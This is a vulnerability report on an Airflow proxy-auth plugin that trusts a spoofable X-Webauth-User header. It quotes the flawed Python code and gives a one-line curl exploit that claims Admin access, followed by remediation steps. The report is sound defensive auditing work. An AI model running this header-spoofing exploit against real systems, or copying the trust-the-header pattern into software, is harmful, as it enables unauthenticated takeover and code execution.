# Vulnerability Report: apps/datascience/airflow/plugins/proxy_auth.py

## CRITICAL: Header Injection Privilege Escalation — Full Airflow Admin Takeover

**CWE:** CWE-290 — Authentication Bypass by Spoofing; CWE-346 — Origin Validation Error

**Description:**
The plugin blindly trusts `X-Webauth-User` and copies it to `REMOTE_USER`:
```python
def copy_remote_user():
    user = request.headers.get("X-Webauth-User")
    if user:
        request.environ["REMOTE_USER"] = user
```
Airflow port 8280 is directly exposed (`hostPort`), bypassing Traefik. No header stripping configured. Combined with `AUTH_USER_REGISTRATION_ROLE = "Admin"`, any client can become Airflow Admin.

**Exploitation Steps:**
```bash
curl -H "X-Webauth-User: attacker@evil.com" http://localhost:8280/airflow/api/v1/dags
# Auto-registers as Admin. Full DAG, Connection, and code execution access.
```

**Impact:** Full Airflow Admin without any credentials. Arbitrary code execution via DAGs.

**Remediation:**
1. Remove `hostPort: 8280`.
2. Add Traefik middleware to strip `X-Webauth-User` from inbound requests.
3. Change `AUTH_USER_REGISTRATION_ROLE` to `"Viewer"`.
